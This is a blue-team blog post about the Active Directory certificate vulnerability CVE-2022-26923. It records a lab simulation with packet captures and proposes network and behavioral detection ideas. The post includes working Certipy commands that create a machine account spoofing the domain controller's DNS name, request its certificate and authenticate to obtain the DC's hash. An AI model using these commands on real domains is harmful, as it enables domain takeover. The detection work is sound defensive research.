---
title: CVE-2022-26923
published: true
---

CVE-2022-26923 is a vulnerability found by ly4k in the post below. Please read his post first as I will not go over technical details about the attack. This post is focused on simulation details & blue team ideas on the network perspective. 

https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4

basic overview of the attack 
1. attacker creates a new machine account as an unprivileged domain user
2. changes dnsHostName attribute of the new machine account to Domain Controller
3. Sends a certificate request using the new machine account
4. Retrieves a Domain Controller certificate
5. Authenticate to Domain Controller with the certificate to obtain NT hash of the Domain Controller account
6. Attack using the NT hash

## [](#header-2)Simulation - Attack
**Attacker**
- IP: 192.168.10.55
- OS: Kali Linux
- Certipy: 3.0.0 (3db9123077233fb0c5f673f78d43b47665e6aea4)

**Victim**
- IP: 192.168.10.11
- OS: Windows Server 2019
- OSVersion: 10.0.17763

Pcap - 2022-05-11-cve-2022-26923.pcap

| Time | Command | Description |
|:----|:---|:---|
| 2022-05-11T07:14:58+00:00 | `certipy account create 'f1.ad.lab.ch/joe:Testing123!@f1-dc-01.f1.ad.lab.ch' -user 'joepc' -dns 'f1-dc-01.f1.ad.lab.ch' -debug` | create a new machine as joe |
| 2022-05-11T07:17:15+00:00 | `certipy req 'f1.ad.lab.ch/JOEPC$:9u3SkJTdBAkv9vz4@f1-dc-01.f1.ad.lab.ch' -ca F1-DC-01-CA -template Machine` | certificate request |
| 2022-05-11T07:18:44+00:00 | `certipy auth -pfx f1-dc-01.pfx -dc-ip 192.168.10.11` | authenticate to dc with certificate |

![](assets/certipy_auth.png)

Once the hash is collected for Domain Controller, many attacks can be done such as DCSync

## [](#header-2)Simulation - Benign
Pcap - 2022-05-11-cve-2022-26923-benign.pcap

**Attacker**
- IP: 192.168.10.55
- OS: Kali Linux
- Certipy: 3.0.0 (3db9123077233fb0c5f673f78d43b47665e6aea4)

**Victim**
- IP: 192.168.10.11
- OS: Windows Server 2019
- OSVersion: 10.0.17763

| Time | Command | Description |
|:----|:----|:----|
| 2022-05-11T08:02:56+00:00 | `certipy account create 'f1.ad.lab.ch/joe:Testing123!@f1.ad.lab.ch' -user 'joebenign' -dns 'joebenign.f1.ad.lab.ch' -debug`  | create a new machine as joe (notice the dns attribute is not Domain Controller) |
| 2022-05-11T08:03:52+00:00 |  `certipy req 'f1.ad.lab.ch/JOEBENIGN$:OKHSdMqcRU3YJzB1@f1.ad.lab.ch' -ca F1-DC-01-CA -template Machine` | certificate request |

## [](#header-2)Simulation - Unencrypted Ldap

Pcap - 2022-05-11-cve-2022-26923-unencrypted_ldap.pcap

**Attacker**
- IP: 192.168.10.55
- OS: Kali Linux
- Certipy: 3.0.0 (3db9123077233fb0c5f673f78d43b47665e6aea4)

**Victim**
- IP: 192.168.10.11
- OS: Windows Server 2019
- OSVersion: 10.0.17763

| Time  | Command   | Description   |
|:---------|:----|:----|
| 2022-05-11T11:54:23+00:00 | `certipy account create 'f1.ad.lab.ch/joe:Testing123!@f1.ad.lab.ch' -user 'joebenign3' -dns 'f1-dc-01.f1.ad.lab.ch' -debug -scheme ldap` | create a new machine as joe using LDAP not LDAPs |

- For some reason fails with message below 

`Received unknown error: (unwillingToPerform) 0000001F: svcErr: DSID-031A1236, problem 5003 (WILL_NOT_PERFORM), data 0`

However we have the unencrypted request packet captured. This will be the easiest dentifier for this attack on the network 

![](assets/ldap_addrequest.png)



### Key point: DNS hostname != UPN 

This attack takes advantage of 
1. domain user by default is allowed to create computer accounts (up to 10)
2. domain user can modify the dnsHostName to anything they wish as long as there is no collision with SPNs
3. certificate is issued with DNSHostname attribute of the account

Further details from ly4k's blogpost 
> First, the account is looked up based on the principal name specified in the AS-REQ, e.g. user@corp.local. Then, depending on the userAccountControl property of the account, the KDC validates the certificate mapping based on either the Subject Alternative Name (SAN) DNSName or UPNName in the certificate. If the WORKSTATION_TRUST_ACCOUNT (domain computer) or SERVER_TRUST_ACCOUNT (domain controller) bit is set, the KDC validates the mapping from the DNSName. Otherwise, the KDC validates the mapping from the UPNName. For this blog post, weâ€™re only interested in the DNSName mapping. The mapping of the DNSName field is described in MS-PKCA 3.1.5.2.1.1.

> The documentation states that the KDC must confirm that the sAMAccountName of the account looked up matches the computer name in the DNSName field of the certificate terminated with $ and that the DNS domain name in the DNSName field of the certificate matches the DNS domain name of the realm. As an example, suppose we have the computer account JOHNPC$ in the domain corp.local. For a valid mapping, the DNSName of the certificate must therefore be JOHNPC.corp.local, i.e. <computername>.<domain>, where <computername> is the sAMAccountName without the trailing `$`

> So during PKINIT Kerberos authentication, we supply a principal name (`e.g. johnpc$@corp.local`) and a certificate with a DNSName set to johnpc.corp.local. The KDC then looks up the account from the principal name. Since johnpc$ is a computer account, the KDC then splits the DNSName field into a computer name and realm part. The KDC then validates that the computer name part matches the sAMAccountName terminated with $ and that the realm part matches the domain. If both parts match, the validation is a success, and the mapping is thus valid. It is worth noting that the dNSHostName property of the account is not used for the certificate mapping. The dNSHostName property is only used when the certificate is requested.

In short, in order for this attack to take place, a Computer Account must have a completely different DnsHostName than its principal name. Theoretically this device will have the dnsHostName of some important server such as Domain Controller. 

# [](#header-1)Detection Ideas

## [](#header-2)LDAP AddRequest
Identify the LDAP addRequest where sAMAccountName without trailing `$` is not contained in dnsHostName 

![](assets/ldap_addrequest.png)

This will be the strongest signal of CVE-2022-23693 being exploited on the network.

However there are few issues with this approach
- certipy by default uses LDAPs making visibility of LDAP requests very difficult as it will go over TLS (if LDAPs decryption is available for LDAP visibility, this would be the best option)
- attackers can always add a computer account without changing dnsHostName attribute and change it later
- attackers can find an existing computer account which one of compromised user can modify. Hence, no need for adding a new computer account, just modify the existing dnsHostName attribute to continue the attack.

## [](#header-2)DCERPC Certreq

Pcap: 2022-05-11-cve-2022-26923.pcap

Frame # 496

Interface UUID: 91ae6020-9e3c-11cf-8d7c-00aa00c091be

Opnum: 0 (CertServerRequest)

MSDOC: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-icpr/d98e6cfb-87ba-4915-b3ec-a1b7c6129a53

2nd part of the attack is actual request of the certificate. To detect this attack, one can parse out the request and the response to compare UPN and returning certificate dnsHostName to make sure the correct certificate was handed back.

Issues with this approach
- certipy encrypts this connection with SMB3 using NTLM of the new computer account, meaning the password is very new, making decryption on wire very difficult without syncing all account passwords every minute
- certipy does another layer of encryption on DCERPC layer by using `PACKET_PRIVACY`, meaning underneath SMB3 NTLM encryption, DCERPC Kerberos encryption is in place. (I have the keytab if you want to take a look at the pcap by decrypting RPC payload)

## [](#header-2)Behavioral Approach
What are some of behavioral approaches we could take to defend this attack? 

- DC certificate is being used by a computer account in the network that has never used this certificate before.

## [](#header-2)Active Scan Approach

Consistently scan domain users to identify an account where dnsHostName attribute does not contain sAMAccountName witout trailing `$` 

Malicious Example:
- sAMAccountName - JOEPC$
- dnsHostName - f1-dc-01.f1.ad.lab.ch

Benign Example:
- sAMAccountName - JOEPC$
- dnsHostName - joepc.f1.ad.lab.ch


## [](#header-2)JA3
`python3 ja3.py 2022-05-11-cve-2022-26923.pcap`
```
[
    {
        "destination_ip": "192.168.10.11",
        "destination_port": 636,
        "ja3": "771,49196-49200-49195-49199-52393-52392-49188-49192-49187-49191-159-158-107-103-255,11-10-35-22-23-13,29-23-30-25-24,0-1-2",
        "ja3_digest": "e9d8351d9365fe7b2c666bf31aad662f",
        "source_ip": "192.168.10.55",
        "source_port": 37105,
        "timestamp": 1652253300.798046
    }
]
```

as far as ja3er.com, signature has not been found as of 2022-05-12
![](assets/ja3_fingerprint.png)

Although this can be a quick and lazy way to find someone using Certipy LDAPs, JA3 signature is not good for identifying known bad signatures. Thus, not a good identifier of the vulnerability.
